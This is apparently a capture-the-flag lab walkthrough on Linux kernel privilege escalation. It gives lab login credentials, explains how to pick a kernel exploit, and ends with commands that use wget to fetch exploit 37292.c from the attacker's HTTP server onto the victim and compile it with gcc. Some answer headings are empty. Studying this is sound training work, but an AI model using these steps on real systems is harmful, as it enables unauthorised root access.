**Note: Launch the target machine attached to this task to follow along.**

**You can launch the target machine and access it directly from your browser.**

**Alternatively, you can access it over SSH with the low-privilege user credentials below:

**Username: karen**

**Password: Password1**

  

Privilege escalation ideally leads to root privileges. This can sometimes be achieved simply by exploiting an existing vulnerability, or in some cases by accessing another user account that has more privileges, information, or access.

  

Unless a single vulnerability leads to a root shell, the privilege escalation process will rely on misconfigurations and lax permissions.

  

The kernel on Linux systems manages the communication between components such as the memory on the system and applications. This critical function requires the kernel to have specific privileges; thus, a successful exploit will potentially lead to root privileges.

  

The Kernel exploit methodology is simple;

1. Identify the kernel version
2. Search and find an exploit code for the kernel version of the target system
3. Run the exploit

Although it looks simple, please remember that a failed kernel exploit can lead to a system crash. Make sure this potential outcome is acceptable within the scope of your penetration testing engagement before attempting a kernel exploit.

  

**Research sources:**  

1. Based on your findings, you can use Google to search for an existing exploit code.
2. Sources such as [https://www.linuxkernelcves.com/cves](https://www.linuxkernelcves.com/cves) can also be useful.
3. Another alternative would be to use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).

**Hints/Notes:**

1. Being too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit
2. Be sure you understand how the exploit code works BEFORE you launch it. Some exploit codes can make changes on the operating system that would make them unsecured in further use or make irreversible changes to the system, creating problems later. Of course, these may not be great concerns within a lab or CTF environment, but these are absolute no-nos during a real penetration testing engagement.
3. Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.
4. You can transfer the exploit code from your machine to the target system using the `SimpleHTTPServer` Python module and `wget` respectively.


### Answer:

#### On Local machine:

Find and download kernel exploit:

#### On victim machine:

IP check (on local machine):

Connect to the server and download the file:

```
wget http://10.8.194.147:8000/37292.c
```

Compile the exploit and execute it:

```
gcc 37292.c -o exploit
```
